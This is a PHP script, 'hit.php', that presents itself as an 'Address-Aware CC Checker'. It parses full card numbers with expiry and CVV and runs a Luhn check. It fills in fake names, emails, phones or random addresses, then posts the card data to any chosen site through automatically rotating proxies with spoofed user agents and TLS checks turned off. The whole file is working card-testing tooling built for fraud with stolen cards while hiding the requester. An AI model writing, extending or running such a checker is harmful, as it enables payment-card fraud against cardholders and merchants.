<?php
declare(strict_types=1);

/**
 * hit.php
 *
 * Lightweight checkout helper that requires an explicit billing address for
 * every card check, injects that address into downstream site requests, and
 * optionally rotates proxies using the same infrastructure as autosh.php.
 */

error_reporting(E_ALL & ~E_DEPRECATED);
@set_time_limit(240);

if (!extension_loaded('curl')) {
    respond_with_error('PHP cURL extension is required. Enable extension=curl in php.ini.', 500, 'json');
}

require_once __DIR__ . '/add.php';
require_once __DIR__ . '/no.php';
require_once __DIR__ . '/ho.php';
require_once __DIR__ . '/ProxyManager.php';
require_once __DIR__ . '/AutoProxyFetcher.php';

$responseMode = resolve_response_mode();
$isHtml = ($responseMode === 'html');

if (!has_value('cc') && $isHtml) {
    render_form();
    exit;
}

$rawCcInput = trim((string) value('cc', ''));
if ($rawCcInput === '') {
    respond_with_error('Missing cc parameter. Expected format: number|month|year|cvv', 400, $responseMode);
}

$card = normalize_card($rawCcInput);
if ($card === null) {
    respond_with_error('Invalid cc format. Use number|month|year|cvv (delimiters: | , / space).', 400, $responseMode);
}

$address = collect_address();
if ($address === null) {
    respond_with_error('Billing address is required (address_line1, city, state, zip). Provide all fields or set allow_random_address=1.', 400, $responseMode);
}

$contact = collect_contact_profile($address);
$siteUrl = sanitize_url(value('site'));
$siteMethod = strtoupper((string) value('site_method', $siteUrl ? 'POST' : 'GET'));
$allowedMethods = ['GET', 'POST', 'PUT', 'PATCH'];
if ($siteUrl && !in_array($siteMethod, $allowedMethods, true)) {
    respond_with_error('Unsupported site_method. Allowed: GET, POST, PUT, PATCH.', 400, $responseMode);
}

$payloadFormat = strtolower((string) value('site_payload_format', 'json'));
if (!in_array($payloadFormat, ['json', 'form', 'raw'], true)) {
    $payloadFormat = 'json';
}

$payloadTemplate = value('site_payload');
$customHeadersParam = value('site_headers');
$rotateProxy = to_bool(value('rotate', '1'));
$explicitProxy = value('proxy');
$noProxy = to_bool(value('noproxy', '0'));
$requireProxy = to_bool(value('require_proxy', '0'));
$debug = to_bool(value('debug', '0'));
$connectTimeout = max(1, (int) value('cto', 8));
$totalTimeout = max($connectTimeout, (int) value('to', 20));

$proxyContext = prepare_proxy_context($rotateProxy, $explicitProxy, $noProxy, $requireProxy, $debug);
if (isset($proxyContext['error'])) {
    respond_with_error($proxyContext['error'], $proxyContext['code'] ?? 500, $responseMode, [
        'proxy' => $proxyContext,
    ]);
}

$uaGenerator = new userAgent();
$userAgent = $uaGenerator->generate('windows');

$card['brand'] = detect_card_brand($card['number']);
$card['luhn_valid'] = luhn_check($card['number']);

$result = [
    'success' => false,
    'status' => $card['luhn_valid'] ? 'card_passed_luhn' : 'card_failed_luhn',
    'card' => [
        'number_masked' => mask_card_number($card['number']),
        'bin' => substr($card['number'], 0, 6),
        'last4' => substr($card['number'], -4),
        'expiry_month' => $card['month'],
        'expiry_year' => $card['year'],
        'brand' => $card['brand'],
        'luhn_valid' => $card['luhn_valid'],
    ],
    'address' => $address,
    'contact' => $contact,
    'proxy' => summarize_proxy($proxyContext),
    'site' => [
        'attempted' => false,
        'url' => $siteUrl,
        'method' => $siteMethod,
        'payload_format' => $payloadFormat,
    ],
    '_meta' => [
        'timestamp' => gmdate('c'),
        'rotate_proxy' => $rotateProxy,
        'debug' => $debug,
        'request_id' => bin2hex(random_bytes(6)),
    ],
];

if (!$card['luhn_valid']) {
    finalize_response($result, $responseMode);
}

if ($siteUrl) {
    $context = build_payload_context($card, $address, $contact);
    $payload = build_site_payload($context, $payloadFormat, $payloadTemplate);
    $customHeaders = parse_custom_headers($customHeadersParam);
    $siteResponse = perform_site_request([
        'url' => $siteUrl,
        'method' => $siteMethod,
        'user_agent' => $userAgent,
        'connect_timeout' => $connectTimeout,
        'total_timeout' => $totalTimeout,
        'payload' => $payload,
        'headers' => $customHeaders,
        'proxy' => $proxyContext['details'] ?? null,
        'debug' => $debug,
    ]);

    $result['site'] = array_merge($result['site'], $siteResponse['meta']);
    $result['proxy'] = summarize_proxy($siteResponse['proxy'] ?? $proxyContext);

    if ($siteResponse['success']) {
        $result['success'] = true;
        $result['status'] = 'site_request_ok';
    } else {
        $result['success'] = false;
        $result['status'] = 'site_request_failed';
        $result['error'] = $siteResponse['error'];
    }
} else {
    $result['success'] = true;
}

finalize_response($result, $responseMode);

// ---------------------------------------------------------------------
// Helper functions
// ---------------------------------------------------------------------

function respond_with_error(string $message, int $code, string $mode, array $extra = []): void
{
    if ($mode === 'html') {
        $errors = $extra['errors'] ?? [];
        array_unshift($errors, $message);
        render_form([
            'errors' => array_values(array_unique($errors)),
            'old' => collect_old_input(),
        ]);
        exit;
    }
    $payload = array_merge([
        'success' => false,
        'error' => $message,
        '_meta' => [
            'timestamp' => gmdate('c'),
            'code' => $code,
        ],
    ], $extra);
    finalize_response($payload, $mode, $code);
}

function finalize_response(array $data, string $mode, int $status = 200): void
{
    if ($mode === 'html') {
        render_html_result($data, $status);
        exit;
    }
    if (!headers_sent()) {
        http_response_code($status);
        header('Content-Type: application/json; charset=utf-8');
    }
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
    exit;
}

function render_form(array $context = []): void
{
    $errors = $context['errors'] ?? [];
    $old = $context['old'] ?? [];
    $h = fn ($value) => htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

    if (!headers_sent()) {
        header('Content-Type: text/html; charset=utf-8');
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hit.php Checker</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 30px; }
        .card { max-width: 860px; margin: 0 auto; background: #1e293b; border-radius: 18px; padding: 28px 32px; box-shadow: 0 20px 60px rgba(15,23,42,0.45); }
        h1 { margin-top: 0; font-size: 28px; display: flex; align-items: center; gap: 12px; }
        form { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin-top: 18px; }
        label { font-size: 13px; text-transform: uppercase; letter-spacing: 0.06em; color: #cbd5f5; }
        input, textarea, select { width: 100%; padding: 11px 12px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: #e2e8f0; margin-top: 6px; font-size: 14px; transition: border 0.2s ease, box-shadow 0.2s ease; }
        input:focus, textarea:focus, select:focus { border-color: #6366f1; outline: none; box-shadow: 0 0 0 3px rgba(99,102,241,0.35); }
        .full-width { grid-column: 1 / -1; }
        button { background: linear-gradient(135deg, #6366f1, #8b5cf6); border: none; color: white; padding: 14px 18px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease; }
        button:hover { transform: translateY(-1px); box-shadow: 0 12px 30px rgba(99,102,241,0.35); }
        .errors { background: rgba(239,68,68,0.18); border: 1px solid rgba(239,68,68,0.35); padding: 12px 16px; border-radius: 10px; color: #fecaca; margin-bottom: 18px; }
        .note { font-size: 13px; color: #94a3b8; margin-top: 6px; }
        .badge { display: inline-block; padding: 6px 12px; border-radius: 8px; background: rgba(34,197,94,0.16); color: #bbf7d0; font-size: 12px; text-transform: uppercase; letter-spacing: 0.08em; }
    </style>
</head>
<body>
    <div class="card">
        <h1>⚡ hit.php — Address-Aware CC Checker</h1>
        <p class="badge">Requires billing address every run</p>
        <?php if (!empty($errors)): ?>
            <div class="errors">
                <strong>We need a bit more info:</strong>
                <ul>
                    <?php foreach ($errors as $error): ?>
                        <li><?= $h($error) ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
        <form method="post">
            <input type="hidden" name="format" value="html">
            <input type="hidden" name="__form_submit" value="1">
            <div class="full-width">
                <label for="cc">Card (number|month|year|cvv)</label>
                <input id="cc" name="cc" placeholder="4111111111111111|12|2025|123" value="<?= $h($old['cc'] ?? '') ?>" required>
            </div>
            <div>
                <label for="address_line1">Address Line 1</label>
                <input id="address_line1" name="address_line1" value="<?= $h($old['address_line1'] ?? '') ?>" required>
            </div>
            <div>
                <label for="address_line2">Address Line 2</label>
                <input id="address_line2" name="address_line2" value="<?= $h($old['address_line2'] ?? '') ?>">
            </div>
            <div>
                <label for="city">City</label>
                <input id="city" name="city" value="<?= $h($old['city'] ?? '') ?>" required>
            </div>
            <div>
                <label for="state">State</label>
                <input id="state" name="state" maxlength="2" placeholder="CA" value="<?= $h($old['state'] ?? '') ?>" required>
            </div>
            <div>
                <label for="zip">ZIP / Postal</label>
                <input id="zip" name="zip" maxlength="10" value="<?= $h($old['zip'] ?? '') ?>" required>
            </div>
            <div>
                <label for="full_name">Full Name</label>
                <input id="full_name" name="full_name" value="<?= $h($old['full_name'] ?? '') ?>" placeholder="John Doe">
            </div>
            <div>
                <label for="email">Email</label>
                <input id="email" type="email" name="email" value="<?= $h($old['email'] ?? '') ?>" placeholder="team@example.com">
            </div>
            <div>
                <label for="phone">Phone</label>
                <input id="phone" name="phone" value="<?= $h($old['phone'] ?? '') ?>" placeholder="+12025550123">
            </div>
            <div>
                <label for="site">Site URL (optional)</label>
                <input id="site" name="site" value="<?= $h($old['site'] ?? '') ?>" placeholder="https://example.com/api/check">
                <p class="note">If provided, the card and address will be POSTed with proxy rotation.</p>
            </div>
            <div>
                <label for="rotate">Rotate Proxy</label>
                <select id="rotate" name="rotate">
                    <option value="1" <?= isset($old['rotate']) && $old['rotate'] === '0' ? '' : 'selected' ?>>Enabled</option>
                    <option value="0" <?= isset($old['rotate']) && $old['rotate'] === '0' ? 'selected' : '' ?>>Disabled</option>
                </select>
            </div>
            <div class="full-width">
                <button type="submit">Run Check</button>
            </div>
        </form>
    </div>
</body>
</html>
<?php
}

function render_html_result(array $data, int $statusCode = 200): void
{
    if (!headers_sent()) {
        http_response_code($statusCode);
        header('Content-Type: text/html; charset=utf-8');
    }
    $h = fn ($value) => htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hit.php Result</title>
    <style>
        body { font-family: "Segoe UI", sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 30px; }
        .wrap { max-width: 960px; margin: 0 auto; }
        .header { margin-bottom: 20px; }
        .status { display: inline-block; padding: 6px 12px; border-radius: 999px; font-size: 13px; letter-spacing: 0.08em; text-transform: uppercase; }
        .status.ok { background: rgba(34,197,94,0.2); color: #86efac; }
        .status.fail { background: rgba(239,68,68,0.2); color: #fecaca; }
        pre { background: #111c33; padding: 22px; border-radius: 14px; font-size: 14px; overflow-x: auto; border: 1px solid rgba(99,102,241,0.25); }
        a { color: #93c5fd; }
        .actions { margin-top: 20px; }
        button { background: linear-gradient(135deg, #6366f1, #8b5cf6); border: none; padding: 12px 18px; border-radius: 12px; color: #fff; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="header">
            <a href="hit.php" style="text-decoration:none;color:#cbd5f5;">← Back to form</a>
            <h1>hit.php Result</h1>
            <span class="status <?= !empty($data['success']) ? 'ok' : 'fail' ?>">
                <?= $h(strtoupper($data['status'] ?? 'UNKNOWN')) ?>
            </span>
        </div>
        <pre><?= $h(json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE)) ?></pre>
        <div class="actions">
            <button onclick="window.history.back()">Run another</button>
        </div>
    </div>
</body>
</html>
<?php
}

function resolve_response_mode(): string
{
    $format = strtolower((string) value('format', ''));
    if (in_array($format, ['html', 'json'], true)) {
        return $format;
    }
    if (isset($_REQUEST['__form_submit'])) {
        return 'html';
    }
    $accept = strtolower($_SERVER['HTTP_ACCEPT'] ?? '');
    if (strpos($accept, 'application/json') !== false) {
        return 'json';
    }
    return 'json';
}

function has_value(string $key): bool
{
    return value($key) !== null && value($key) !== '';
}

function value(string $key, $default = null)
{
    if (isset($_POST[$key])) {
        return $_POST[$key];
    }
    if (isset($_GET[$key])) {
        return $_GET[$key];
    }
    return $default;
}

function collect_old_input(): array
{
    return [
        'cc' => (string) value('cc', ''),
        'address_line1' => (string) value('address_line1', ''),
        'address_line2' => (string) value('address_line2', ''),
        'city' => (string) value('city', ''),
        'state' => (string) value('state', ''),
        'zip' => (string) value('zip', ''),
        'country' => (string) value('country', 'US'),
        'full_name' => (string) value('full_name', ''),
        'email' => (string) value('email', ''),
        'phone' => (string) value('phone', ''),
        'site' => (string) value('site', ''),
        'rotate' => (string) value('rotate', '1'),
    ];
}

function normalize_card(string $raw): ?array
{
    $parts = preg_split('/[|,;\\s\\/]+/', trim($raw));
    if (!$parts || count($parts) < 4) {
        return null;
    }
    $number = preg_replace('/\\D+/', '', $parts[0]);
    $month = str_pad(preg_replace('/\\D+/', '', $parts[1]), 2, '0', STR_PAD_LEFT);
    $year = preg_replace('/\\D+/', '', $parts[2]);
    $cvv = preg_replace('/\\D+/', '', $parts[3]);
    if (strlen($number) < 12 || strlen($month) !== 2 || strlen($year) < 2 || strlen($cvv) < 3) {
        return null;
    }
    if (strlen($year) === 2) {
        $year = (int) $year;
        $year += $year >= 80 ? 1900 : 2000;
    }
    return [
        'number' => $number,
        'month' => $month,
        'year' => (string) $year,
        'cvv' => $cvv,
    ];
}

function luhn_check(string $number): bool
{
    $sum = 0;
    $alt = false;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = (int) $number[$i];
        if ($alt) {
            $n *= 2;
            if ($n > 9) {
                $n -= 9;
            }
        }
        $sum += $n;
        $alt = !$alt;
    }
    return ($sum % 10) === 0;
}

function detect_card_brand(string $number): string
{
    $patterns = [
        'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard' => '/^(5[1-5][0-9]{14}|2(2[2-9][0-9]{12}|[3-6][0-9]{13}|7[01][0-9]{12}|720[0-9]{12}))$/',
        'amex' => '/^3[47][0-9]{13}$/',
        'discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'jcb' => '/^(?:2131|1800|35\\d{3})\\d{11}$/',
    ];
    foreach ($patterns as $brand => $regex) {
        if (preg_match($regex, $number)) {
            return $brand;
        }
    }
    return 'unknown';
}

function mask_card_number(string $number): string
{
    $len = strlen($number);
    if ($len <= 4) {
        return $number;
    }
    $first = substr($number, 0, 6);
    $last = substr($number, -4);
    return $first . str_repeat('•', max(0, $len - 10)) . $last;
}

function collect_address(): ?array
{
    $allowRandom = to_bool(value('allow_random_address'));
    $addr = [
        'line1' => trim((string) value('address_line1', '')),
        'line2' => trim((string) value('address_line2', '')),
        'city' => trim((string) value('city', '')),
        'state' => strtoupper(trim((string) value('state', ''))),
        'zip' => trim((string) value('zip', '')),
        'country' => strtoupper(trim((string) value('country', 'US'))),
    ];

    $hasAll = $addr['line1'] !== '' && $addr['city'] !== '' && $addr['state'] !== '' && $addr['zip'] !== '';

    if (!$hasAll && !$allowRandom) {
        return null;
    }

    if (!$hasAll && $allowRandom) {
        $random = AddressProvider::getRandomAddress();
        $addr['line1'] = $random['numd'] . ' ' . $random['address1'];
        $addr['line2'] = '';
        $addr['city'] = $random['city'];
        $addr['state'] = $random['state'];
        $addr['zip'] = $random['zip'];
        $addr['country'] = 'US';
    }

    $addr['formatted'] = AddressProvider::formatAddress([
        'numd' => explode(' ', $addr['line1'])[0] ?? $addr['line1'],
        'address1' => preg_replace('/^[0-9]+\\s*/', '', $addr['line1']),
        'city' => $addr['city'],
        'state' => $addr['state'],
        'zip' => $addr['zip'],
    ]);

    return $addr;
}

function collect_contact_profile(array $address): array
{
    $fullName = trim((string) value('full_name', ''));
    if ($fullName === '') {
        $fullName = generate_placeholder_name();
    }
    $email = trim((string) value('email', ''));
    if ($email === '') {
        $email = slugify($fullName) . '@examplemail.test';
    }
    $phone = trim((string) value('phone', ''));
    if ($phone === '') {
        $phone = function_exists('generatePhoneNumber') ? generatePhoneNumber() : '+12025550123';
    }
    return [
        'full_name' => $fullName,
        'email' => $email,
        'phone' => $phone,
        'country' => $address['country'] ?? 'US',
    ];
}

function generate_placeholder_name(): string
{
    static $first = ['Alex', 'Jordan', 'Taylor', 'Casey', 'Hayden', 'Morgan', 'Quinn', 'Riley', 'Sydney', 'Rowan', 'Drew', 'Phoenix', 'Reese', 'Skye', 'Logan'];
    static $last = ['Walker', 'Brooks', 'Foster', 'Hayes', 'Bennett', 'Parker', 'Jensen', 'Sawyer', 'Collins', 'Hudson', 'Hale', 'Mercer', 'Reid', 'Chandler', 'Ellis'];
    return $first[array_rand($first)] . ' ' . $last[array_rand($last)];
}

function slugify(string $text): string
{
    $text = strtolower($text);
    $text = preg_replace('/[^a-z0-9]+/', '.', $text);
    return trim($text, '.');
}

function sanitize_url($url): ?string
{
    if (!is_string($url) || trim($url) === '') {
        return null;
    }
    $url = trim($url);
    if (!preg_match('#^https?://#i', $url)) {
        $url = 'https://' . $url;
    }
    return filter_var($url, FILTER_VALIDATE_URL) ?: null;
}

function to_bool($value): bool
{
    if (is_bool($value)) {
        return $value;
    }
    $value = strtolower((string) $value);
    return in_array($value, ['1', 'true', 'yes', 'on'], true);
}

function prepare_proxy_context(bool $rotateProxy, ?string $explicitProxy, bool $noProxy, bool $requireProxy, bool $debug): array
{
    $context = [
        'mode' => $noProxy ? 'direct' : 'none',
        'used' => false,
        'details' => null,
        'debug' => $debug,
    ];

    if ($noProxy) {
        return $context;
    }

    if ($explicitProxy) {
        $parsed = parse_proxy_string($explicitProxy);
        if ($parsed === null) {
            return [
                'error' => 'Invalid proxy format. Use type://ip:port[:user:pass] or ip:port:user:pass',
                'code' => 400,
            ];
        }
        $context['mode'] = 'explicit';
        $context['used'] = true;
        $context['details'] = $parsed;
        return $context;
    }

    if (!$rotateProxy) {
        if ($requireProxy) {
            return [
                'error' => 'Proxy required but none provided and rotation disabled.',
                'code' => 400,
            ];
        }
        $context['mode'] = 'direct';
        return $context;
    }

    $autoFetcher = new AutoProxyFetcher(['debug' => $debug]);
    if ($autoFetcher->needsFetch()) {
        $autoFetcher->ensureProxies();
    }

    $pm = new ProxyManager();
    $count = $pm->loadFromFile(__DIR__ . '/ProxyList.txt');

    if ($count === 0) {
        if ($requireProxy) {
            return [
                'error' => 'Proxy rotation requested but no proxies available in ProxyList.txt.',
                'code' => 503,
            ];
        }
        $context['mode'] = 'direct';
        return $context;
    }

    $proxy = $pm->getNextProxy(false);
    if (!$proxy) {
        if ($requireProxy) {
            return [
                'error' => 'Failed to acquire rotating proxy.',
                'code' => 503,
            ];
        }
        $context['mode'] = 'direct';
        return $context;
    }

    $context['mode'] = 'rotating';
    $context['used'] = true;
    $context['details'] = [
        'type' => $proxy['type'] ?? 'http',
        'ip' => $proxy['ip'] ?? '',
        'port' => (string) ($proxy['port'] ?? ''),
        'user' => $proxy['user'] ?? '',
        'pass' => $proxy['pass'] ?? '',
    ];
    return $context;
}

function summarize_proxy(array $context): array
{
    if (empty($context['used'])) {
        return [
            'used' => false,
            'mode' => $context['mode'] ?? 'direct',
        ];
    }
    $details = $context['details'] ?? [];
    return [
        'used' => true,
        'mode' => $context['mode'] ?? 'unknown',
        'type' => $details['type'] ?? 'http',
        'endpoint' => isset($details['ip'], $details['port']) ? ($details['ip'] . ':' . $details['port']) : null,
        'has_auth' => !empty($details['user']) && !empty($details['pass']),
    ];
}

function parse_proxy_string(string $proxy): ?array
{
    $raw = trim($proxy);
    if ($raw === '') {
        return null;
    }
    $type = 'http';
    if (preg_match('/^(https?|socks5h?|socks5|socks4a?|socks4|residential|rotating|datacenter|mobile|isp):\\/\\/(.+)$/i', $raw, $m)) {
        $type = strtolower($m[1]);
        $raw = $m[2];
        if (in_array($type, ['residential', 'rotating', 'datacenter', 'mobile', 'isp'], true)) {
            $type = 'http';
        }
    }
    $user = '';
    $pass = '';
    if (strpos($raw, '@') !== false) {
        [$auth, $raw] = explode('@', $raw, 2);
        if (strpos($auth, ':') !== false) {
            [$user, $pass] = explode(':', $auth, 2);
        } else {
            $user = $auth;
        }
    }
    $parts = explode(':', $raw);
    if (count($parts) < 2) {
        return null;
    }
    $host = trim($parts[0]);
    $port = trim($parts[1]);
    if (!is_numeric($port)) {
        return null;
    }
    if ($user === '' && isset($parts[2], $parts[3])) {
        $user = trim($parts[2]);
        $pass = trim($parts[3]);
    }
    return [
        'type' => $type,
        'ip' => $host,
        'port' => $port,
        'user' => $user,
        'pass' => $pass,
    ];
}

function build_payload_context(array $card, array $address, array $contact): array
{
    $names = explode(' ', $contact['full_name'], 2);
    return [
        'card_number' => $card['number'],
        'card_number_masked' => mask_card_number($card['number']),
        'expiry_month' => $card['month'],
        'expiry_year' => $card['year'],
        'cvv' => $card['cvv'],
        'brand' => $card['brand'],
        'first_name' => $names[0] ?? $contact['full_name'],
        'last_name' => $names[1] ?? ($names[0] ?? ''),
        'full_name' => $contact['full_name'],
        'email' => $contact['email'],
        'phone' => $contact['phone'],
        'address_line1' => $address['line1'],
        'address_line2' => $address['line2'],
        'address_city' => $address['city'],
        'address_state' => $address['state'],
        'address_zip' => $address['zip'],
        'address_country' => $address['country'],
    ];
}

function build_site_payload(array $context, string $format, ?string $template): array
{
    $base = [
        'card' => [
            'number' => $context['card_number'],
            'expiry_month' => $context['expiry_month'],
            'expiry_year' => $context['expiry_year'],
            'cvv' => $context['cvv'],
            'brand' => $context['brand'],
        ],
        'billing' => [
            'line1' => $context['address_line1'],
            'line2' => $context['address_line2'],
            'city' => $context['address_city'],
            'state' => $context['address_state'],
            'zip' => $context['address_zip'],
            'country' => $context['address_country'],
        ],
        'contact' => [
            'full_name' => $context['full_name'],
            'email' => $context['email'],
            'phone' => $context['phone'],
        ],
    ];

    $summary = [
        'card_number_masked' => $context['card_number_masked'],
        'card_brand' => $context['brand'],
        'address' => [
            'line1' => $context['address_line1'],
            'city' => $context['address_city'],
            'state' => $context['address_state'],
            'zip' => $context['address_zip'],
        ],
    ];

    if ($template !== null && $template !== '') {
        $body = apply_template($template, $context);
        return [
            'body' => $body,
            'headers' => build_headers_for_format($format),
            'summary' => $summary,
        ];
    }

    switch ($format) {
        case 'form':
            $flat = [
                'card_number' => $context['card_number'],
                'expiry_month' => $context['expiry_month'],
                'expiry_year' => $context['expiry_year'],
                'cvv' => $context['cvv'],
                'full_name' => $context['full_name'],
                'email' => $context['email'],
                'phone' => $context['phone'],
                'address_line1' => $context['address_line1'],
                'address_line2' => $context['address_line2'],
                'city' => $context['address_city'],
                'state' => $context['address_state'],
                'zip' => $context['address_zip'],
                'country' => $context['address_country'],
            ];
            return [
                'body' => http_build_query($flat),
                'headers' => ['Content-Type: application/x-www-form-urlencoded'],
                'summary' => $summary,
            ];

        case 'raw':
            return [
                'body' => apply_template('{{card_number}}|{{expiry_month}}|{{expiry_year}}|{{cvv}}', $context),
                'headers' => [],
                'summary' => $summary,
            ];

        case 'json':
        default:
            return [
                'body' => json_encode($base, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE),
                'headers' => ['Content-Type: application/json'],
                'summary' => $summary,
            ];
    }
}

function build_headers_for_format(string $format): array
{
    switch ($format) {
        case 'form':
            return ['Content-Type: application/x-www-form-urlencoded'];
        case 'json':
            return ['Content-Type: application/json'];
        default:
            return [];
    }
}

function apply_template(string $template, array $context): string
{
    $replacements = [];
    foreach ($context as $key => $value) {
        $replacements['{{' . $key . '}}'] = $value;
    }
    return strtr($template, $replacements);
}

function parse_custom_headers($headersParam): array
{
    if ($headersParam === null || $headersParam === '') {
        return [];
    }
    if (is_array($headersParam)) {
        return array_map('trim', $headersParam);
    }
    $lines = preg_split('/\\r?\\n/', trim((string) $headersParam));
    return array_filter(array_map('trim', $lines));
}

function perform_site_request(array $options): array
{
    $url = $options['url'];
    $method = strtoupper($options['method']);
    $payload = $options['payload'];
    $headers = $options['headers'];
    $proxy = $options['proxy'];
    $userAgent = $options['user_agent'];
    $connectTimeout = $options['connect_timeout'];
    $totalTimeout = $options['total_timeout'];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_CONNECTTIMEOUT => $connectTimeout,
        CURLOPT_TIMEOUT => $totalTimeout,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_USERAGENT => $userAgent,
        CURLOPT_ENCODING => '',
        CURLOPT_HTTPHEADER => array_merge([
            'Accept: application/json, text/html;q=0.9,*/*;q=0.8',
        ], $payload['headers'] ?? [], $headers),
    ]);

    if ($method === 'GET') {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    } else {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload['body'] ?? '');
    }

    if ($proxy && !empty($proxy['ip']) && !empty($proxy['port'])) {
        apply_proxy_to_curl($ch, $proxy, $url);
    }

    $raw = curl_exec($ch);
    $curlError = $raw === false ? curl_error($ch) : null;
    $info = curl_getinfo($ch);
    curl_close($ch);

    $httpCode = (int) ($info['http_code'] ?? 0);
    $success = $curlError === null && $httpCode >= 200 && $httpCode < 400;
    $snippet = is_string($raw) ? substr($raw, 0, 600) : '';

    return [
        'success' => $success,
        'error' => $curlError,
        'proxy' => [
            'used' => $proxy !== null,
            'mode' => $proxy ? 'applied' : 'direct',
            'details' => $proxy,
        ],
        'meta' => [
            'attempted' => true,
            'http_code' => $httpCode,
            'success' => $success,
            'latency_ms' => isset($info['total_time']) ? round($info['total_time'] * 1000, 2) : null,
            'connect_ms' => isset($info['connect_time']) ? round($info['connect_time'] * 1000, 2) : null,
            'redirects' => $info['redirect_count'] ?? 0,
            'effective_url' => $info['url'] ?? $url,
            'response_bytes' => is_string($raw) ? strlen($raw) : 0,
            'response_preview' => $snippet,
            'request_summary' => $payload['summary'] ?? [],
        ],
    ];
}

function apply_proxy_to_curl($ch, array $proxy, string $url): void
{
    $type = strtolower($proxy['type'] ?? 'http');
    $curlType = CURLPROXY_HTTP;
    switch ($type) {
        case 'https':
            $curlType = CURLPROXY_HTTPS;
            break;
        case 'socks4':
            $curlType = CURLPROXY_SOCKS4;
            break;
        case 'socks4a':
            $curlType = defined('CURLPROXY_SOCKS4A') ? CURLPROXY_SOCKS4A : CURLPROXY_SOCKS4;
            break;
        case 'socks5':
            $curlType = CURLPROXY_SOCKS5;
            break;
        case 'socks5h':
            $curlType = defined('CURLPROXY_SOCKS5_HOSTNAME') ? CURLPROXY_SOCKS5_HOSTNAME : CURLPROXY_SOCKS5;
            break;
    }
    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
    $needsTunnel = ($scheme === 'https' && ($curlType === CURLPROXY_HTTP || $curlType === CURLPROXY_HTTPS));

    curl_setopt_array($ch, [
        CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
        CURLOPT_PROXYTYPE => $curlType,
        CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
    ]);

    if (!empty($proxy['user']) && !empty($proxy['pass'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
    }
}
